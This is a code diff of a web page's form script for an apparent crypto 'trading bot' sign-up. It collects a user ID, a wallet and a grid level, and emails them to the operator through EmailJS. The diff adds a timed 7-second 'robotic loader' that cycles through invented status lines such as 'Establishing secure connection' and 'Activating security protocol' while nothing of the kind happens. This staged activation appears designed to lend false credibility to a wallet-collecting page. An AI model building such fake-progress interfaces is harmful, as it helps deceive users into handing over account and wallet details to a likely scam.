+
+    const uidInput =
+      document.getElementById(
+        'uid'
+      );
+
+
+    const walletInput =
+      document.getElementById(
+        'wallet'
+      );
+
+
+    const cryptoInput =
+      document.getElementById(
+        'crypto'
+      );
+
+
+    const inputs = [
+
+      { el: uidInput },
+
+      { el: walletInput },
+
+      { el: cryptoInput }
+
+    ].filter(
+      item => item.el
+    );
+
+
+
+    /* =================================================
+       SETUP LABELS + ERROR SPANS
+    ================================================= */
+
+    inputs.forEach(
+      item => {
+
+
+        /*
+         * IMPORTANT FIX:
+         * Find the label from the parent
+         * form-group.
+         *
+         * This keeps Plan validation working
+         * even though the input is inside
+         * the dropdown wrapper.
+         */
+
+        const label =
+          item.el
+            .closest('.form-group')
+            ?.querySelector('label');
+
+
+        if(!label) return;
+
+
+        item.label =
+          label;
+
+
+        item.originalLabel =
+          label.textContent;
+
+
+        const errorSpan =
+          document.createElement(
+            'span'
+          );
+
+
+        errorSpan.className =
+          'js-error';
+
+
+        errorSpan.style.cssText =
+          `color:red;
+           font-size:12px;
+           margin-right:5px;
+           opacity:0;
+           transition:opacity 0.3s ease-in;`;
+
+
+        label.prepend(
+          errorSpan
+        );
+
+
+        item.errorEl =
+          errorSpan;
+
+
+      }
+    );
+
+
+
+    /* =================================================
+       VALIDATION FUNCTIONS
+    ================================================= */
+
+    let checkboxError;
+
+
 
     function clearErrors() {
-      inputs.forEach(item => { 
-        if(item.errorEl && item.label){ 
-          item.errorEl.textContent = ''; 
-          item.errorEl.style.opacity = '0'; 
-          item.label.textContent = item.originalLabel;
-          item.label.prepend(item.errorEl);
+
+
+      inputs.forEach(
+        item => {
+
+
+          if(
+            item.errorEl &&
+            item.label
+          ) {
+
+
+            item.errorEl.textContent =
+              '';
+
+
+            item.errorEl.style.opacity =
+              '0';
+
+
+            item.label.textContent =
+              item.originalLabel;
+
+
+            item.label.prepend(
+              item.errorEl
+            );
+
+
+          }
+
         }
-      });
-      checkboxError.textContent = '';
-      checkboxError.style.opacity = '0';
+      );
+
+
+      if(checkboxError) {
+
+        checkboxError.textContent =
+          '';
+
+
+        checkboxError.style.opacity =
+          '0';
+
+      }
+
+
     }
 
-    function showError(item, msg) {
+
+
+    function showError(
+      item,
+      msg
+    ) {
+
+
       if(!item.label) return;
-      item.label.textContent = ''; // hide label
-      item.errorEl.textContent = msg;
-      item.label.prepend(item.errorEl);
-      setTimeout(() => { item.errorEl.style.opacity = '1'; }, 10);
+
+
+      item.label.textContent =
+        '';
+
+
+      item.errorEl.textContent =
+        msg;
+
+
+      item.label.prepend(
+        item.errorEl
+      );
+
+
+      setTimeout(
+        () => {
+
+          item.errorEl.style.opacity =
+            '1';
+
+        },
+        10
+      );
+
+
     }
+
+
 
     function validateField(item) {
+
+
       if(!item.label) return;
-      if(item.el.value.trim() === '') {
-        item.label.textContent = item.originalLabel;
-        item.label.prepend(item.errorEl);
+
+
+      if(
+        item.el.value.trim() === ''
+      ) {
+
+
+        item.label.textContent =
+          item.originalLabel;
+
+
+        item.label.prepend(
+          item.errorEl
+        );
+
+
       } else {
+
+
         clearErrors();
+
+
       }
+
+
     }
 
-    // 4. HANDLE SUBMIT - WITH EMAILJS
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      clearErrors();
 
-      const allEmpty = inputs.every(item => item.el.value.trim() === '');
-      if (allEmpty) {
-        alert("pls fill in the form to proceed");
-        return;
+
+    /* =================================================
+       PLAN OPTIONS
+    ================================================= */
+
+    planOptions.forEach(
+      function(option) {
+
+
+        option.addEventListener(
+          'click',
+          function(event) {
+
+
+            event.stopPropagation();
+
+
+            planInput.value =
+              option.textContent.trim();
+
+
+            planWrapper.classList.remove(
+              'open'
+            );
+
+
+            /*
+             * Clear the Plan error after
+             * selecting a valid option.
+             */
+
+            const planItem =
+              inputs.find(
+                item =>
+                  item.el === planInput
+              );
+
+
+            if(planItem) {
+
+              validateField(
+                planItem
+              );
+
+            }
+
+
+          }
+        );
+
+
       }
+    );
 
-      for(let item of inputs) {
-        if (item.el.value.trim() === '') {
-          showError(item, `pls enter your "${item.el.placeholder}"`);
-          item.el.focus();
-          return;
+
+
+    /* =================================================
+       CLOSE PLAN DROPDOWN
+    ================================================= */
+
+    document.addEventListener(
+      'click',
+      function(event) {
+
+
+        if(
+          !planWrapper.contains(
+            event.target
+          )
+        ) {
+
+
+          planWrapper.classList.remove(
+            'open'
+          );
+
+
         }
+
       }
+    );
 
-      if (!checkbox.checked) {
-        checkboxError.textContent = "pls confirm you've provided the correct details";
-        setTimeout(() => { checkboxError.style.opacity = '1'; }, 10);
-        return;
-      }
 
-      // SEND TO EMAILJS
-      submitBtn.disabled = true;
-      submitBtn.textContent = "Submitting...";
 
-      const templateParams = {
-        uid: uidInput.value,
-        wallet: walletInput.value,
-        crypto: cryptoInput.value
-      };
+    /* =================================================
+       GRID LEVEL DROPDOWN
+    ================================================= */
 
-      emailjs.send("service_yx1rj2j", "template_qz0audi", templateParams)
-        .then(() => {
-          // Hide form and show success message
-          formContainer.style.display = 'none';
-          successContainer.style.display = 'block';
-        }, (error) => {
-          alert("Failed to send. Please check your internet and try again.");
+    if(cryptoInput) {
+
+
+      const cryptoWrapper =
+        document.createElement(
+          'div'
+        );
+
+
+      cryptoWrapper.style.position =
+        'relative';
+
+
+      cryptoInput.parentNode.insertBefore(
+        cryptoWrapper,
+        cryptoInput
+      );
+
+
+      cryptoWrapper.appendChild(
+        cryptoInput
+      );
+
+
+      const arrow =
+        document.createElement(
+          'span'
+        );
+
+
+      arrow.innerHTML =
+        '▼';
+
+
+      arrow.style.position =
+        'absolute';
+
+
+      arrow.style.right =
+        '12px';
+
+
+      arrow.style.top =
+        '50%';
+
+
+      arrow.style.transform =
+        'translateY(-50%)';
+
+
+      arrow.style.pointerEvents =
+        'none';
+
+
+      arrow.style.color =
+        '#999';
+
+
+      arrow.style.fontSize =
+        '12px';
+
+
+      cryptoWrapper.appendChild(
+        arrow
+      );
+
+
+
+      const cryptoList = [
+
+        '5 grids',
+
+        '10 grids',
+
+        '20 grids',
+
+        '30 grids',
+
+        '50 grids',
+
+        '75 grids',
+
+        '100 grids',
+
+        '150 grids',
+
+        '200 grids'
+
+      ];
+
+
+
+      const dropdown =
+        document.createElement(
+          'ul'
+        );
+
+
+      dropdown.style.cssText =
+        `position:absolute;
+         top:100%;
+         left:0;
+         right:0;
+         background:black;
+         border:1px solid #ddd;
+         border-radius:8px;
+         max-height:200px;
+         overflow-y:auto;
+         z-index:999;
+         list-style:none;
+         padding:5px 0;
+         margin-top:5px;
+         color:white;
+         box-shadow:0 4px 10px rgba(0,0,0,0.1);
+         display:none;`;
+
+
+      cryptoWrapper.appendChild(
+        dropdown
+      );
+
+
+
+      cryptoList.forEach(
+        coin => {
+
+
+          const li =
+            document.createElement(
+              'li'
+            );
+
+
+          li.textContent =
+            coin;
+
+
+          li.style.cssText =
+            `padding:10px 14px;
+             cursor:pointer;
+             font-size:14px;`;
+
+
+          li.onmouseover = () => {
+
+            li.style.background =
+              '#f5f5f5';
+
+          };
+
+
+          li.onmouseout = () => {
+
+            li.style.background =
+              '#fff';
+
+          };
+
+
+
+          li.onclick = () => {
+
+
+            cryptoInput.value =
+              coin;
+
+
+            dropdown.style.display =
+              'none';
+
+
+            arrow.innerHTML =
+              '▼';
+
+
+            const cryptoItem =
+              inputs.find(
+                item =>
+                  item.el === cryptoInput
+              );
+
+
+            if(cryptoItem) {
+
+              validateField(
+                cryptoItem
+              );
+
+            }
+
+
+          };
+
+
+          dropdown.appendChild(
+            li
+          );
+
+
+        }
+      );
+
+
+
+      cryptoInput.addEventListener(
+        'focus',
+        () => {
+
+
+          dropdown.style.display =
+            'block';
+
+
+          arrow.innerHTML =
+            '▲';
+
+
+        }
+      );
+
+
+
+      document.addEventListener(
+        'click',
+        (e) => {
+
+
+          if(
+            !cryptoWrapper.contains(
+              e.target
+            )
+          ) {
+
+
+            dropdown.style.display =
+              'none';
+
+
+            arrow.innerHTML =
+              '▼';
+
+
+          }
+
+
+        }
+      );
+
+
+    }
+
+
+
+    /* =================================================
+       CHECKBOX ERROR
+    ================================================= */
+
+    if(checkbox) {
+
+
+      const checkboxContainer =
+        checkbox.parentElement;
+
+
+      checkboxError =
+        document.createElement(
+          'div'
+        );
+
+
+      checkboxError.className =
+        'js-checkbox-error';
+
+
+      checkboxError.style.cssText =
+        `color:red;
+         font-size:13px;
+         text-align:center;
+         margin-top:5px;
+         margin-bottom:15px;
+         opacity:0;
+         transition:opacity 0.3s ease-in;`;
+
+
+      checkboxContainer.after(
+        checkboxError
+      );
+
+
+    }
+
+
+
+    /* =================================================
+       ROBOTIC LOADER FUNCTION
+       
+       EXACT DURATION:
+       7 SECONDS
+    ================================================= */
+
+    function startBotLoader() {
+
+
+      return new Promise(
+        function(resolve) {
+
+
+          const totalDuration =
+            7000;
+
+
+          const startTime =
+            Date.now();
+
+
+          const messages = [
+
+            "Establishing secure connection",
+
+            "Scanning trading environment",
+
+            "Checking system parameters",
+
+            "Initializing trading engine",
+
+            "Loading bot configuration",
+
+            "Synchronizing market data",
+
+            "Activating security protocol",
+
+            "Preparing trading core",
+
+            "Finalizing system initialization"
+
+          ];
+
+
+          botLoaderOverlay.style.display =
+            'flex';
+
+
+          loaderPercentage.textContent =
+            '0%';
+
+
+          loaderProgressFill.style.width =
+            '0%';
+
+
+          loaderStatus.textContent =
+            messages[0];
+
+
+
+          function updateLoader() {
+
+
+            const elapsed =
+              Date.now() -
+              startTime;
+
+
+            let progress =
+              Math.min(
+                (elapsed / totalDuration) *
+                100,
+                100
+              );
+
+
+            progress =
+              Math.floor(
+                progress
+              );
+
+
+            loaderPercentage.textContent =
+              progress + '%';
+
+
+            loaderProgressFill.style.width =
+              progress + '%';
+
+
+
+            let messageIndex =
+              Math.floor(
+                (progress / 100) *
+                messages.length
+              );
+
+
+            if(
+              messageIndex >=
+              messages.length
+            ) {
+
+              messageIndex =
+                messages.length - 1;
+
+            }
+
+
+            loaderStatus.textContent =
+              messages[messageIndex];
+
+
+
+            if(
+              elapsed < totalDuration
+            ) {
+
+
+              requestAnimationFrame(
+                updateLoader
+              );
+
+
+            } else {
+
+
+              loaderPercentage.textContent =
+                '100%';
+
+
+              loaderProgressFill.style.width =
+                '100%';
+
+
+              loaderStatus.textContent =
+                'SYSTEM READY';
+
+
+              resolve();
+
+
+            }
+
+          }
+
+
+          requestAnimationFrame(
+            updateLoader
+          );
+
+
+        }
+      );
+
+    }
+
+
+
+    /* =================================================
+       FORM SUBMIT
+    ================================================= */
+
+    form.addEventListener(
+      'submit',
+      async function(e) {
+
+
+        e.preventDefault();
+
+
+        clearErrors();
+
+
+
+        /* =============================================
+           CHECK IF EVERYTHING IS EMPTY
+        ============================================= */
+
+        const allEmpty =
+          inputs.every(
+            item =>
+              item.el.value.trim() === ''
+          );
+
+
+        if(allEmpty) {
+
+
+          emptyFormAlert.classList.add(
+            'show'
+          );
+
+
+          return;
+
+
+        }
+
+
+
+        /* =============================================
+           CHECK INDIVIDUAL FIELDS
+        ============================================= */
+
+        for(
+          let item of inputs
+        ) {
+
+
+          if(
+            item.el.value.trim() === ''
+          ) {
+
+
+            showError(
+              item,
+              ` enter "${item.el.placeholder}"`
+            );
+
+
+            item.el.focus();
+
+
+            return;
+
+
+          }
+
+        }
+
+
+
+        /* =============================================
+           CHECK ATTESTATION
+        ============================================= */
+
+        if(
+          !checkbox.checked
+        ) {
+
+
+          checkboxError.textContent =
+            "pls confirm setup";
+
+
+          setTimeout(
+            () => {
+
+              checkboxError.style.opacity =
+                '1';
+
+            },
+            10
+          );
+
+
+          return;
+
+
+        }
+
+
+
+        /* =============================================
+           PREPARE EMAIL DATA
+        ============================================= */
+
+        const templateParams = {
+
+
+          uid:
+            uidInput.value,
+
+
+          wallet:
+            walletInput.value,
+
+
+          crypto:
+            cryptoInput.value
+
+
+        };
+
+
+
+        /* =============================================
+           PREVENT DOUBLE CLICK
+        ============================================= */
+
+        submitBtn.disabled =
+          true;
+
+
+        submitBtn.textContent =
+          "Activating...";
+
+
+
+        /*
+         * IMPORTANT:
+         *
+         * EmailJS starts sending RIGHT NOW.
+         *
+         * At the same time, the robotic loader
+         * starts its 7-second activation process.
+         */
+
+        const emailPromise =
+          emailjs.send(
+            "service_yx1rj2j",
+            "template_qz0audi",
+            templateParams
+          );
+
+
+
+        const loaderPromise =
+          startBotLoader();
+
+
+
+        /* =============================================
+           WAIT FOR BOTH
+           
+           The success message will NOT appear until:
+           
+           1. The 7-second loader is complete
+           AND
+           2. EmailJS successfully sends the data
+        ============================================= */
+
+        try {
+
+
+          await Promise.all([
+
+            emailPromise,
+
+            loaderPromise
+
+          ]);
+
+
+
+          /* =========================================
+             ACTIVATION SUCCESS
+          ========================================= */
+
+          formContainer.style.display =
+            'none';
+
+
+          botLoaderOverlay.style.display =
+            'none';
+
+
+          successContainer.style.display =
+            'block';
+
+
+        }
+
+        catch(error) {
+
+
           console.log(error);
-          submitBtn.disabled = false;
-          submitBtn.textContent = "Submit";
-        });
-    });
 
-    // 5. OK BUTTON - EXIT ACTION
-    okBtn.addEventListener('click', function() {
-      window.location.href = "index.html"; // Change this to where you want to exit to
-    });
 
-    // 6. ON TYPING: clear error and bring label back
-    inputs.forEach(item => {
-      item.el.addEventListener('input', () => {
-        validateField(item);
-        checkboxError.textContent = ''; checkboxError.style.opacity = '0';
-      });
-    });
-    checkbox.addEventListener('change', () => {
-      checkboxError.textContent = ''; checkboxError.style.opacity = '0';
-    });
+          /* =========================================
+             EMAIL FAILED
+          ========================================= */
+
+          botLoaderOverlay.style.display =
+            'none';
+
+
+          submitBtn.disabled =
+            false;
+
+
+          submitBtn.textContent =
+            "Activate bot";
+
+
+          alert(
+            "Failed to send. Please check your internet and try again."
+          );
+
+
+        }
+
+
+      }
+    );
+
+
+
+    /* =================================================
+       SUCCESS OK BUTTON
+    ================================================= */
+
+    okBtn.addEventListener(
+      'click',
+      function() {
+
+
+        window.location.href =
+          "Page1.Html";
+
+
+      }
+    );
+
+
+
+    /* =================================================
+       CLEAR ERRORS WHEN TYPING
+    ================================================= */
+
+    inputs.forEach(
+      item => {
+
+
+        item.el.addEventListener(
+          'input',
+          () => {
+
+
+            validateField(
+              item
+            );
+
+
+            if(checkboxError) {
+
+
+              checkboxError.textContent =
+                '';
+
+
+              checkboxError.style.opacity =
+                '0';
+
+
+            }
+
+
+          }
+        );
+
+
+      }
+    );
+
+
+
+    /* =================================================
+       CHECKBOX CHANGE
+    ================================================= */
+
+    checkbox.addEventListener(
+      'change',
+      () => {
+
+
+        checkboxError.textContent =
+          '';
+
+
+        checkboxError.style.opacity =
+          '0';
+
+
+      }
+    );
+
+
   }
-});
+);
+
 </script>
+
+
 </body>
+
 </html>
